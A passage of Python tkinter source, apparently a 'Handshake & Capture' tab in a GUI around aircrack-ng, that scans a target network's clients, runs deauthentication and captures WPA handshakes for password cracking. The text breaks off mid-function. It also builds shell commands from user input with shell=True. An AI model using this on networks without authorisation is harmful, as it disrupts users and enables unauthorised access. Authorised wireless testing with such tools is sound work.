import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import re
import threading
import os
import time
from utils import run_command

def handshake_detected_in_output(output):
    """Return True if aircrack-ng output indicates a valid handshake."""
    if not output:
        return False
    if "No valid WPA handshakes found" in output:
        return False
    match = re.search(r"WPA \((\d+) handshake", output)
    if match and int(match.group(1)) >= 1:
        return True
    if "[ WPA handshake:" in output:
        return True
    return False

def eapol_packet_count(cap_file):
    """Return the number of EAPOL packets in the capture file using tcpdump."""
    try:
        output = run_command(f"tcpdump -r {cap_file} eapol 2>/dev/null | wc -l", timeout=10)
        count = int(output.strip()) if output and output.strip().isdigit() else 0
        return count
    except Exception:
        return 0

def eapol_packet_details(cap_file):
    """Return details of EAPOL packets in the capture file using tcpdump."""
    try:
        output = run_command(f"tcpdump -nn -r {cap_file} eapol 2>/dev/null", timeout=10)
        return output if output else ""
    except Exception as e:
        return f"Error getting EAPOL details: {str(e)}"

class HandshakeTab:
    def __init__(self, notebook, app):
        self.app = app
        self.handshake_tab = ttk.Frame(notebook, style='Main.TFrame')
        notebook.add(self.handshake_tab, text="Handshake & Capture")
        self.create_network_selection()
        self.create_device_section()

    def create_network_selection(self):
        """Create the network selection section with fields and button on one line."""
        network_frame = ttk.LabelFrame(self.handshake_tab, text="Target Network Configuration", style='Card.TLabelframe')
        network_frame.pack(fill="x", padx=10, pady=10)
        network_container = ttk.Frame(network_frame)
        network_container.pack(fill="x", padx=15, pady=10)
        ttk.Label(network_container, text="Target BSSID:", style='Info.TLabel').pack(side="left", padx=(0, 5))
        bssid_entry = ttk.Entry(network_container, textvariable=self.app.selected_bssid, font=('Arial', 10), width=20)
        bssid_entry.pack(side="left", padx=(0, 10))
        ttk.Label(network_container, text="Channel:", style='Info.TLabel').pack(side="left", padx=(0, 5))
        channel_entry = ttk.Entry(network_container, textvariable=self.app.selected_channel, font=('Arial', 10), width=10)
        channel_entry.pack(side="left", padx=(0, 10))
        select_btn = ttk.Button(network_container, text="📡 Select from Network Tab", style='Primary.TButton', command=self.select_network)
        select_btn.pack(side="left")

    def create_device_section(self):
        """Create the connected devices section with separate capture and deauth controls."""
        device_frame = ttk.LabelFrame(self.handshake_tab, text="Connected Devices", style='Card.TLabelframe')
        device_frame.pack(fill="both", expand=True, padx=10, pady=10)
        device_controls = ttk.Frame(device_frame)
        device_controls.pack(fill="x", padx=15, pady=10)

        scan_btn = ttk.Button(device_controls, text="🔍 Discover Devices", style='Primary.TButton', command=self.scan_clients)
        scan_btn.pack(side="left", padx=(0, 10))

        capture_btn = ttk.Button(device_controls, text="📡 Start Capture", style='Primary.TButton', command=self.start_capture)
        capture_btn.pack(side="left", padx=(0, 10))

        deauth_btn = ttk.Button(device_controls, text="⚡ Start Deauth", style='Warning.TButton', command=self.deauth_clients)
        deauth_btn.pack(side="left", padx=(0, 10))

        stop_deauth_btn = ttk.Button(device_controls, text="🛑 Stop Deauth", style='Danger.TButton', command=self.stop_deauth)
        stop_deauth_btn.pack(side="left", padx=(0, 10))

        stop_btn = ttk.Button(device_controls, text="⏹️ Stop Capture", style='Danger.TButton', command=self.stop_capture)
        stop_btn.pack(side="left", padx=(0, 10))

        save_btn = ttk.Button(device_controls, text="💾 Save Capture", style='Primary.TButton', command=self.save_capture)
        save_btn.pack(side="left", padx=(0, 10))

        self.app.broadcast_deauth.set(True)
        broadcast_cb = ttk.Checkbutton(device_controls, text="Broadcast Deauth", variable=self.app.broadcast_deauth, style='TCheckbutton')
        broadcast_cb.pack(side="left", padx=(10, 10))
        tree_container = ttk.Frame(device_frame)
        tree_container.pack(fill="both", expand=True, padx=15, pady=(0, 10))
        self.client_tree = ttk.Treeview(tree_container, 
                                       columns=("BSSID", "STATION", "PWR", "Rate", "Lost", "Frames", "Notes", "Probes"), 
                                       show="headings",
                                       height=8,
                                       style='Clean.Treeview')
        style = ttk.Style()
        style.configure('Clean.Treeview',
                       background='#ffffff',
                       foreground='#000000',
                       fieldbackground='#ffffff',
                       font=('Arial', 10))
        style.map('Clean.Treeview',
                 background=[('selected', '#b3d7ff')],
                 foreground=[('selected', '#000000')])
        style.configure('Eapol.Treeview',
                       background='#90EE90',
                       foreground='#000000',
                       font=('Arial', 10))
        self.client_tree.heading("BSSID", text="BSSID")
        self.client_tree.heading("STATION", text="Device MAC")
        self.client_tree.heading("PWR", text="Power")
        self.client_tree.heading("Rate", text="Rate")
        self.client_tree.heading("Lost", text="Lost")
        self.client_tree.heading("Frames", text="Frames")
        self.client_tree.heading("Notes", text="Notes")
        self.client_tree.heading("Probes", text="Probes")
        self.client_tree.column("BSSID", width=150, minwidth=120)
        self.client_tree.column("STATION", width=150, minwidth=120)
        self.client_tree.column("PWR", width=80, minwidth=60)
        self.client_tree.column("Rate", width=80, minwidth=60)
        self.client_tree.column("Lost", width=80, minwidth=60)
        self.client_tree.column("Frames", width=80, minwidth=60)
        self.client_tree.column("Notes", width=100, minwidth=80)
        self.client_tree.column("Probes", width=150, minwidth=120)
        tree_scroll_y = ttk.Scrollbar(tree_container, orient="vertical", command=self.client_tree.yview, style='Vertical.TScrollbar')
        tree_scroll_x = ttk.Scrollbar(tree_container, orient="horizontal", command=self.client_tree.xview, style='Horizontal.TScrollbar')
        self.client_tree.configure(yscrollcommand=tree_scroll_y.set, xscrollcommand=tree_scroll_x.set)
        self.client_tree.pack(side="left", fill="both", expand=True)
        tree_scroll_y.pack(side="right", fill="y")
        tree_scroll_x.pack(side="bottom", fill="x")
        self.client_tree.bind("<Double-1>", self.on_device_select)
        self.client_tree.update_idletasks()

    def show_handshake_modal(self):
        """Show a modal dialog when a handshake is captured, offering save options."""
        self.app.log_message("Showing handshake capture modal...", "INFO")
        try:
            modal = tk.Toplevel(self.app.root)
            modal.title("Handshake Captured")
            modal.transient(self.app.root)
            modal.grab_set()
            modal.geometry("350x140")
            ttk.Label(modal, text="Handshake captured successfully!\nYou can now proceed to crack the password.", font=("Arial", 11)).pack(pady=20)
            ok_btn = ttk.Button(modal, text="OK", command=modal.destroy)
            ok_btn.pack(pady=10)
            ok_btn.focus_set()
            modal.update_idletasks()
            x = self.app.root.winfo_x() + (self.app.root.winfo_width() // 2) - (modal.winfo_width() // 2)
            y = self.app.root.winfo_y() + (self.app.root.winfo_height() // 2) - (modal.winfo_height() // 2)
            modal.geometry(f"+{x}+{y}")
            modal.focus_set()
            self.app.log_message("Handshake modal displayed successfully.", "SUCCESS")
        except Exception as e:
            self.app.log_message(f"Error displaying handshake modal: {str(e)}", "ERROR")

    def _handle_save_handshake(self, modal):
        """Handle saving the handshake file from the modal."""
        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        # Wait for capture process to finish and file to be fully written
        for _ in range(10):
            if self.app.capture_process and self.app.capture_process.poll() is None:
                time.sleep(1)
            else:
                break
        time.sleep(2)  # Additional wait to ensure file is flushed
        output = run_command(f"aircrack-ng {cap_file}", timeout=30)
        if output and "[ WPA handshake:" in output:
            self.save_capture()
        else:
            self.app.log_message(f"No valid WPA handshake in {cap_file} after modal. Try again.", "WARNING")
            messagebox.showwarning("Warning", f"No valid WPA handshake found in {cap_file}. Try a longer capture or broadcast deauth.")
        modal.destroy()

    def _handle_continue_without_saving(self, modal):
        """Handle continuing without saving the handshake file."""
        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        time.sleep(2)
        output = run_command(f"aircrack-ng {cap_file}", timeout=30)
        if os.path.exists(cap_file) and output and "[ WPA handshake:" in output:
            self.app.handshake_file.set(os.path.abspath(cap_file))
            self.app.log_message(f"Handshake loaded into Password Cracking tab without saving. Path: {cap_file}", "SUCCESS")
        else:
            self.app.log_message(f"Error: {cap_file} not found or no valid handshake. Cannot load without saving.", "ERROR")
            messagebox.showerror("Error", f"{cap_file} not found or no valid handshake. Please save the capture first.")
        modal.destroy()

    def on_device_select(self, event):
        """Handle device selection from treeview."""
        selection = self.client_tree.selection()
        if selection:
            item = self.client_tree.item(selection[0])
            values = item['values']
            if values:
                station = values[1]
                self.app.selected_client.set(station)
                self.app.log_message(f"Selected device: {station}", "SUCCESS")
                self.app.broadcast_deauth.set(False)

    def select_network(self):
        """Select a network from the network tab."""
        selected = self.app.network_tab.network_tree.selection()
        if selected:
            values = self.app.network_tab.network_tree.item(selected[0])["values"]
            self.app.selected_bssid.set(values[0])
            self.app.selected_channel.set(values[2])
            self.app.log_message(f"Selected network: {values[1]} ({values[0]}) on channel {values[2]}", "SUCCESS")

    def scan_clients(self):
        """Scan for devices connected to the selected network with a modal progress bar."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            messagebox.showerror("Error", "Please select a network and enable monitor mode.")
            return
        self.app.log_message(f"Verifying monitor interface {monitor} for device scan (Working dir: {os.getcwd()})...", "INFO")
        iw_output = run_command(f"iw dev {monitor} info", timeout=5)
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            messagebox.showerror("Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            self.app.log_message(f"Invalid BSSID format: {bssid}", "ERROR")
            messagebox.showerror("Error", "Invalid BSSID format. Use XX:XX:XX:XX:XX:XX (e.g., 00:11:22:33:44:55).")
            return
        if not channel:
            for item in self.app.network_tab.network_tree.get_children():
                values = self.app.network_tab.network_tree.item(item)["values"]
                if values[0] == bssid and values[2]:
                    channel = values[2]
                    self.app.log_message(f"Using channel {channel} from network scan.", "INFO")
                    break
        if channel and not re.match(r"^\d+$", channel) or not (1 <= int(channel) <= 13):
            self.app.log_message(f"Invalid channel {channel}. Using all channels.", "WARNING")
            channel = ""
        if channel:
            output = run_command(f"iw dev {monitor} set channel {channel}", timeout=5)
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        modal = tk.Toplevel(self.handshake_tab)
        modal.title("Scanning Devices")
        modal.transient(self.handshake_tab)
        modal.grab_set()
        modal.geometry("350x120")
        ttk.Label(modal, text="Scanning for connected devices...", font=("Arial", 11)).pack(pady=10)
        progress = ttk.Progressbar(modal, mode='determinate', maximum=100)
        progress.pack(fill="x", padx=20, pady=10)
        percent_label = ttk.Label(modal, text="Progress: 0%")
        percent_label.pack(pady=5)
        def scan():
            clients_file = os.path.join(os.getcwd(), "clients-01.csv")
            if os.path.exists(clients_file):
                try:
                    os.remove(clients_file)
                    self.app.log_message(f"Removed existing {clients_file}.", "INFO")
                except Exception as e:
                    self.app.log_message(f"Error removing {clients_file}: {str(e)}", "ERROR")
            cmd = f"airodump-ng --bssid {bssid} --write clients --output-format csv"
            if channel:
                cmd += f" --channel {channel}"
            cmd += f" {monitor}"
            self.app.log_message(f"Running: {cmd} (Working dir: {os.getcwd()})", "INFO")
            try:
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='latin-1',
                    errors='ignore'
                )
            except Exception as e:
                self.app.log_message(f"Failed to start airodump-ng: {str(e)}. Ensure sudo permissions.", "ERROR")
                modal.destroy()
                self.app.root.after(0, messagebox.showerror, "Error", f"Failed to start device scan: {str(e)}. Ensure aircrack-ng is installed and run with sudo.")
                return
            for i in range(101):
                time.sleep(0.15)  # 0.15s * 100 = 15s
                progress["value"] = i
                percent_label.config(text=f"Progress: {i}%")
                modal.update_idletasks()
            try:
                process.terminate()
                stdout, stderr = process.communicate(timeout=5)
                self.app.log_message("airodump-ng terminated gracefully.", "INFO")
                if stdout:
                    self.app.log_message(f"airodump-ng stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"airodump-ng stderr: {stderr[:500]}...", "ERROR")
            except subprocess.TimeoutExpired:
                self.app.log_message("airodump-ng did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False, timeout=5)
                try:
                    stdout, stderr = process.communicate(timeout=2)
                    if stdout:
                        self.app.log_message(f"airodump-ng stdout: {stdout[:500]}...", "INFO")
                    if stderr:
                        self.app.log_message(f"airodump-ng stderr: {stderr[:500]}...", "ERROR")
                except subprocess.TimeoutExpired:
                    self.app.log_message("airodump-ng still running after forced kill attempt.", "ERROR")
            modal.destroy()
            self.app.root.after(0, messagebox.showinfo, "Scan Complete", "Device scan finished.")
            if not os.path.exists(clients_file):
                self.app.log_message(f"Error: {clients_file} not found. Device scan may have failed.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Device scan failed: {clients_file} not found. Check log output for airodump-ng errors or run with sudo.")
                return
            try:
                with open(clients_file, "r", encoding="utf-8", errors="ignore") as f:
                    self.app.log_message(f"Reading {clients_file}...", "INFO")
                    lines = f.readlines()
                    self.app.log_message(f"Found {len(lines)} lines in {clients_file}.", "INFO")
                    client_section = False
                    for i, line in enumerate(lines):
                        line = line.strip()
                        if not line:
                            self.app.log_message(f"Line {i+1}: Skipping empty line.", "INFO")
                            continue
                        if "Station MAC" in line:
                            client_section = True
                            self.app.log_message(f"Line {i+1}: Reached device section.", "INFO")
                            continue
                        if client_section and "," in line:
                            parts = [part.strip() for part in line.split(",")]
                            self.app.log_message(f"Line {i+1}: Raw CSV data - {line}", "DEBUG")
                            self.app.log_message(f"Line {i+1}: Parsed {len(parts)} fields - {parts}", "DEBUG")
                            if len(parts) >= 6:
                                station = parts[0]
                                frames = parts[1] if len(parts) > 1 else ""
                                lost = parts[2] if len(parts) > 2 else ""
                                pwr = parts[3] if len(parts) > 3 else ""
                                rate = parts[4] if len(parts) > 4 else ""
                                assoc_bssid = parts[5] if len(parts) > 5 else ""
                                notes = parts[6] if len(parts) > 6 else ""
                                probes = ",".join(parts[7:]) if len(parts) > 7 else ""
                                if station and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station):
                                    self.client_tree.insert("", "end", values=(assoc_bssid, station, pwr, rate, lost, frames, notes, probes))
                                    self.app.log_message(f"Line {i+1}: Added device - STATION: {station}, BSSID: {assoc_bssid}, PWR: {pwr}, Notes: '{notes}', Probes: '{probes}'", "SUCCESS")
                                else:
                                    self.app.log_message(f"Line {i+1}: Invalid STATION MAC format: {station}", "WARNING")
                            else:
                                self.app.log_message(f"Line {i+1}: Too few fields ({len(parts)}), skipping.", "WARNING")
                    if not self.client_tree.get_children():
                        self.app.log_message("No valid devices found in clients-01.csv.", "WARNING")
            except FileNotFoundError:
                self.app.log_message(f"Error: {clients_file} not found after scan.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Device scan failed: {clients_file} not found.")
            except Exception as e:
                self.app.log_message(f"Error parsing {clients_file}: {str(e)}", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Error parsing {clients_file}: {str(e)}")
            finally:
                if os.path.exists(clients_file):
                    try:
                        os.remove(clients_file)
                        self.app.log_message(f"Cleaned up {clients_file}.", "INFO")
                    except Exception as e:
                        self.app.log_message(f"Error cleaning up {clients_file}: {str(e)}", "ERROR")
                self.client_tree.update_idletasks()
                self.app.log_message(f"Treeview refreshed. Current items: {len(self.client_tree.get_children())}", "DEBUG")
        threading.Thread(target=scan, daemon=True).start()

    def find_channel(self, bssid, monitor):
        """Scan to find the channel for a given BSSID."""
        temp_file = os.path.join(os.getcwd(), "temp_scan-01.csv")
        cmd = f"airodump-ng --bssid {bssid} --write temp_scan --output-format csv {monitor}"
        self.app.log_message(f"Running channel scan: {cmd} (Working dir: {os.getcwd()})", "INFO")
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='latin-1',
                errors='ignore'
            )
            time.sleep(10)
            try:
                process.terminate()
                stdout, stderr = process.communicate(timeout=5)
                self.app.log_message("Channel scan terminated gracefully.", "INFO")
                if stdout:
                    self.app.log_message(f"Channel scan stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"Channel scan stderr: {stderr[:500]}...", "ERROR")
            except subprocess.TimeoutExpired:
                self.app.log_message("Channel scan did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False, timeout=5)
                try:
                    stdout, stderr = process.communicate(timeout=2)
                    if stdout:
                        self.app.log_message(f"Channel scan stdout: {stdout[:500]}...", "INFO")
                    if stderr:
                        self.app.log_message(f"Channel scan stderr: {stderr[:500]}...", "ERROR")
                except subprocess.TimeoutExpired:
                    self.app.log_message("Channel scan still running after forced kill attempt.", "ERROR")
        except Exception as e:
            self.app.log_message(f"Failed to start channel scan: {str(e)}. Ensure sudo permissions.", "ERROR")
            return None
        if os.path.exists(temp_file):
            try:
                with open(temp_file, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()
                    for line in lines:
                        if bssid in line and "," in line:
                            parts = line.split(",")
                            if len(parts) >= 4:
                                channel = parts[3].strip()
                                if re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
                                    self.app.log_message(f"Found channel {channel} for BSSID {bssid}.", "INFO")
                                    return channel
            except Exception as e:
                self.app.log_message(f"Error parsing {temp_file}: {str(e)}", "ERROR")
            finally:
                if os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                        self.app.log_message(f"Cleaned up {temp_file}.", "INFO")
                    except Exception as e:
                        self.app.log_message(f"Error cleaning up {temp_file}: {str(e)}", "ERROR")
        self.app.log_message(f"No valid channel found for BSSID {bssid}.", "WARNING")
        return None

    def update_probes_column(self, client_mac):
        """Update the Probes column to 'EAPOL' for the client(s) with the matching MAC or BSSID."""
        self.app.log_message(f"Updating Probes column for client_mac: {client_mac}...", "INFO")
        bssid = self.app.selected_bssid.get()
        updated = False
        if not bssid:
            self.app.log_message("No BSSID selected. Cannot update Probes column.", "ERROR")
            return
        is_broadcast = client_mac.lower() == "ff:ff:ff:ff:ff:ff"
        if not is_broadcast and not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client_mac):
            self.app.log_message(f"Invalid client MAC format: {client_mac}", "ERROR")
            return
        def update_treeview():
            nonlocal updated
            for item in self.client_tree.get_children():
                values = self.client_tree.item(item)["values"]
                self.app.log_message(f"Checking Treeview item: STATION={values[1]}, BSSID={values[0]}, Values={values}", "DEBUG")
                if values and len(values) > 1:
                    if is_broadcast and values[0].lower() == bssid.lower():
                        self.client_tree.set(item, column="Probes", value="EAPOL")
                        self.client_tree.item(item, tags=('eapol_row',))
                        self.app.log_message(f"Updated Probes to 'EAPOL' for STATION {values[1]} (BSSID match: {bssid})", "SUCCESS")
                        updated = True
                    elif values[1].lower() == client_mac.lower():
                        self.client_tree.set(item, column="Probes", value="EAPOL")
                        self.client_tree.item(item, tags=('eapol_row',))
                        self.app.log_message(f"Updated Probes to 'EAPOL' for STATION {client_mac}", "SUCCESS")
                        updated = True
                    else:
                        if values[7] != "EAPOL":
                            self.client_tree.item(item, tags=())
            if not updated:
                self.app.log_message(f"No matching clients found for client_mac: {client_mac}, BSSID: {bssid}", "WARNING")
            self.client_tree.update_idletasks()
            self.app.log_message(f"Treeview refreshed. Current items: {len(self.client_tree.get_children())}", "DEBUG")
        self.app.root.after(0, update_treeview)

    def start_capture(self):
        """Start capturing handshake for selected network."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        client_mac = self.app.selected_client.get() if self.app.selected_client.get() else None
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return
        if not run_command("which tcpdump", timeout=5):
            self.app.log_message("tcpdump not found. Please install tcpdump.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "tcpdump is required for handshake detection. Install it with: sudo apt-get install tcpdump")
            return
        self.app.log_message(f"Starting handshake capture for BSSID {bssid} on {monitor} (Working dir: {os.getcwd()})...", "INFO")
        if client_mac:
            self.app.log_message(f"Targeting client {client_mac} for handshake capture.", "INFO")
        iw_output = run_command(f"iw dev {monitor} info", timeout=5)
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return
        if not channel:
            self.app.log_message("No channel specified. Scanning to find correct channel...", "INFO")
            channel = self.find_channel(bssid, monitor)
            if channel:
                self.app.selected_channel.set(channel)
                self.app.log_message(f"Detected channel {channel} for BSSID {bssid}.", "INFO")
            else:
                self.app.log_message("Warning: Could not detect channel. Proceeding without channel specification.", "WARNING")
        if channel and re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
            output = run_command(f"iw dev {monitor} set channel {channel}", timeout=5)
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        else:
            self.app.log_message("No valid channel specified. Ensure correct channel for better results.", "WARNING")
        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        if os.path.exists(cap_file):
            try:
                os.remove(cap_file)
                self.app.log_message(f"Removed existing {cap_file}.", "INFO")
            except Exception as e:
                self.app.log_message(f"Error removing {cap_file}: {str(e)}. Ensure sudo permissions.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Failed to remove existing {cap_file}: {str(e)}. Run with sudo.")
                return
        for item in self.client_tree.get_children():
            values = self.client_tree.item(item)["values"]
            if values[7] == "EAPOL":
                self.client_tree.set(item, column="Probes", value="")
                self.client_tree.item(item, tags=())
            if values[6]:
                self.client_tree.set(item, column="Notes", value=values[6])
            self.client_tree.update_idletasks()
        cmd = f"airodump-ng --bssid {bssid} --write handshake --output-format pcap --write-interval 1 --ignore-negative-one"
        if channel:
            cmd += f" --channel {channel}"
        cmd += f" {monitor}"
        max_duration = 1800  # 30 minutes

        def capture():
            try:
                self.app.log_message(f"Running capture: {cmd} (Working dir: {os.getcwd()})", "INFO")
                self.app.capture_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='latin-1',
                    errors='ignore'
                )
                timeout = 60  # Increased to 60s for capture file creation
                start_time = time.time()
                while not os.path.exists(cap_file) and time.time() - start_time < timeout:
                    time.sleep(1)
                if not os.path.exists(cap_file):
                    self.app.log_message(f"Error: {cap_file} not created after {timeout} seconds. Check adapter or permissions.", "ERROR")
                    self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {cap_file} not found. Check adapter, permissions, or run with sudo.")
                    self.app.capture_process = None
                    return
                self.app.log_message(f"Capture file {cap_file} created.", "SUCCESS")
                last_size = 0
                start_time = time.time()
                eapol_count = 0
                while self.app.capture_process.poll() is None and (time.time() - start_time) < max_duration:
                    stdout_line = self.app.capture_process.stdout.readline()
                    if stdout_line:
                        self.app.log_message(f"Capture stdout: {stdout_line[:500]}...", "INFO")
                    stderr_line = self.app.capture_process.stderr.readline()
                    if stderr_line:
                        self.app.log_message(f"Capture stderr: {stderr_line[:500]}...", "ERROR")
                    if os.path.exists(cap_file):
                        current_size = os.path.getsize(cap_file)
                        if current_size != last_size:
                            self.app.log_message(f"Capture file size: {current_size} bytes", "INFO")
                            last_size = current_size
                        try:
                            output = run_command(f"tcpdump -r {cap_file} eapol 2>/dev/null | wc -l", timeout=10)
                            new_eapol_count = int(output.strip()) if output and output.strip().isdigit() else 0
                            if new_eapol_count > eapol_count:
                                self.app.log_message(f"Detected {new_eapol_count} EAPOL packets via tcpdump.", "INFO")
                                eapol_count = new_eapol_count
                                self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                            output = run_command(f"aircrack-ng {cap_file}", timeout=30)
                            if output and "[ WPA handshake: " in output:
                                self.app.log_message(f"Handshake detected via aircrack-ng: {output[:500]}...", "SUCCESS")
                                self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                self.stop_capture()
                                self.app.root.after(0, self.show_handshake_modal)
                                return
                            self.app.log_message(f"aircrack-ng check: {output[:500]}...", "INFO")
                        except Exception as e:
                            self.app.log_message(f"Error checking handshake: {str(e)}", "ERROR")
                    time.sleep(0.5)
                if os.path.exists(cap_file):
                    output = run_command(f"aircrack-ng {cap_file}", timeout=30)
                    if output and "[ WPA handshake: " in output:
                        self.app.log_message(f"Handshake detected via aircrack-ng: {output[:500]}...", "SUCCESS")
                        self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                        self.stop_capture()
                        self.app.root.after(0, self.show_handshake_modal)
                        return
                self.stop_capture()
                self.app.log_message(f"Passive capture timed out after {max_duration//60} minutes. No handshake detected.", "WARNING")
                self.app.root.after(0, messagebox.showwarning, "Warning", f"No handshake detected after {max_duration//60} minutes. Try a different device, broadcast deauth, longer capture, stronger signal, or verify adapter compatibility.")
            except Exception as e:
                self.app.log_message(f"Capture error: {str(e)}. Ensure sudo permissions.", "ERROR")
                self.stop_capture()
                self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {str(e)}. Ensure sudo permissions and check adapter.")
        threading.Thread(target=capture, daemon=True).start()
        self.app.root.after(0, messagebox.showinfo, "Info", "Passive handshake capture started. For faster results, start deauth to force client reconnections, or wait for natural connections.")

    def capture_with_deauth(self):
        """Start periodic deauth bursts and capture handshake for selected network."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        broadcast = self.app.broadcast_deauth.get()
        selected = self.client_tree.selection()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return
        if not broadcast and not selected:
            self.app.log_message("Please select a device or enable Broadcast Deauth.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a device or enable Broadcast Deauth.")
            return
        if not run_command("which aireplay-ng", timeout=5):
            self.app.log_message("aireplay-ng not found. Please install aircrack-ng suite.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "aireplay-ng is required for deauthentication. Install it with: sudo apt-get install aircrack-ng")
            return
        if not run_command("which tcpdump", timeout=5):
            self.app.log_message("tcpdump not found. Please install tcpdump.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "tcpdump is required for handshake detection. Install it with: sudo apt-get install tcpdump")
            return
        if monitor == "wlan0" and self.app.monitor_interface.get() and self.app.monitor_interface.get() != "wlan0":
            self.app.log_message(f"Interface mismatch: using monitor interface {self.app.monitor_interface.get()} instead of wlan0.", "WARNING")
            monitor = self.app.monitor_interface.get()
        iw_output = run_command(f"iw dev {monitor} info", timeout=5)
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return
        # Reset adapter to clean state
        self.app.log_message(f"Resetting adapter {monitor} before deauth...", "INFO")
        run_command(f"sudo ip link set {monitor} down", timeout=5)
        run_command(f"sudo ip link set {monitor} up", timeout=5)
        injection_test = run_command(f"aireplay-ng --test {monitor}", timeout=30)
        if not injection_test or "Injection is working!" not in injection_test:
            self.app.log_message(f"Packet injection test failed on {monitor}: {injection_test}", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"Packet injection not supported on {monitor}. Ensure your adapter supports monitor mode and injection. Try 'aireplay-ng --test {monitor}' manually.")
            return
        self.app.log_message(f"Packet injection test passed on {monitor}.", "INFO")
        # Check AP signal strength from Network Tab
        ap_pwr = None
        for item in self.app.network_tab.network_tree.get_children():
            values = self.app.network_tab.network_tree.item(item)["values"]
            if values[0] == bssid:
                try:
                    ap_pwr = int(values[3]) if values[3] else None
                    if ap_pwr is not None and ap_pwr > -70:
                        self.app.log_message(f"Warning: Weak AP signal strength for {bssid} (PWR: {ap_pwr} dBm). Deauth may be unreliable.", "WARNING")
                        self.app.root.after(0, messagebox.showwarning, "Warning", f"Weak AP signal for {bssid} (PWR: {ap_pwr} dBm). Move closer to the AP or use a high-gain antenna.")
                except (ValueError, TypeError) as e:
                    self.app.log_message(f"Invalid AP PWR for {bssid}: {values[3]}. Skipping AP signal check.", "WARNING")
                break
        # Check for 802.11w (MGT protection) using subprocess directly
        mgt_protected = False
        temp_file = os.path.join(os.getcwd(), "temp_check-01.csv")
        cmd = f"airodump-ng --bssid {bssid} --output-format csv --write temp_check -w temp_check {monitor}"
        self.app.log_message(f"Checking for 802.11w: {cmd}", "INFO")
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='latin-1',
                errors='ignore'
            )
            time.sleep(10)  # Allow 10 seconds for scan
            try:
                process.terminate()
                stdout, stderr = process.communicate(timeout=5)
                self.app.log_message("802.11w check terminated gracefully.", "INFO")
                if stdout:
                    self.app.log_message(f"802.11w check stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"802.11w check stderr: {stderr[:500]}...", "ERROR")
            except subprocess.TimeoutExpired:
                self.app.log_message("802.11w check did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False, timeout=5)
                stdout, stderr = process.communicate(timeout=2)
                if stdout:
